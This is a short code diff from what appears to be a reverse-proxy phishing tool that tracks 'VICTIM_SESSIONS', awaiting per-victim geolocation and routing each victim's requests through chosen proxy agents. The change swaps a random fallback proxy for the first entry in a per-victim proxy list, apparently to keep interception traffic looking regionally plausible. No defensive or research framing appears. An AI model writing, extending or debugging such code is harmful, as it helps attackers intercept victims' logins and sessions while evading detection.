@@ -390,15 +390,12 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
     if (VICTIM_SESSIONS[currentSession].geoPromise) {
         await VICTIM_SESSIONS[currentSession].geoPromise;
     }
-    let proxyAgent = VICTIM_SESSIONS[currentSession].proxyAgent;
-
-if (!proxyAgent) {
-    // If no proxy has been set for any reason, create a global proxy
-    const fallbackUrl = buildProxyUrl(null, generateRandomString(8));
-    console.log(`ðŸŒ Using fallback global proxy: ${fallbackUrl}`);
-    proxyAgent = buildProxyAgentFromUrl(fallbackUrl);
-    VICTIM_SESSIONS[currentSession].proxyAgent = proxyAgent;
-}
+    if (!VICTIM_SESSIONS[currentSession].proxyAgent && VICTIM_SESSIONS[currentSession].proxyLevels?.length > 0) {
+        const firstProxy = VICTIM_SESSIONS[currentSession].proxyLevels[0];
+        console.log(`🌍 Using proxy (${firstProxy.level}): ${firstProxy.url}`);
+        VICTIM_SESSIONS[currentSession].proxyAgent = buildProxyAgentFromUrl(firstProxy.url);
+    }
+    const proxyAgent = VICTIM_SESSIONS[currentSession].proxyAgent;
     // ========== END NEW ==========
 
     const isHttps = proxyRequestProtocol === "https:";
